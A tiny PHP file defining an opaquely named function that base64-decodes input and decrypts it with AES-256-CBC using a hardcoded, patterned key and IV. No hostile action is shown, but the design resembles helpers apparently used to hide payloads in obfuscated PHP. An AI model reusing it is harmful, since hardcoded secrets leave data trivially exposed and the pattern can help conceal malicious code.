<?php
function e7061($e){
	$ed = base64_decode($e);
	$n = openssl_decrypt("$ed","AES-256-CBC","2222222288888888",0,"1111111177777777");
	return $n;
}
?>